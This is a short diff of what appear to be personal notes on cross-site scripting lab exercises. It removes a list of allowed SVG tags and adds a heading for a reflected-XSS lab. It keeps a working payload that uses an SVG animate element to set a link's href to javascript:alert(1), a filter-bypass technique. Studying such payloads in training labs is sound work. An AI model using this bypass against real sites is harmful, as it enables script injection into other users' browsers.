@@ -21,16 +21,11 @@
 [INFO] Allowed tag: title
 ```
 
-* Allowed "svg" tags
-```
-[INFO] Allowed tag: a
-[INFO] Allowed tag: animate
-[INFO] Allowed tag: image
-[INFO] Allowed tag: svg
-[INFO] Allowed tag: title
-```
-
 * Payload
 ```html
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click Me</text></a>
 ```
+
+## 5) Reflected XSS with some SVG markup allowed
+- Any characters after `<svg><` will cause "Tag is not allwed" error.
+
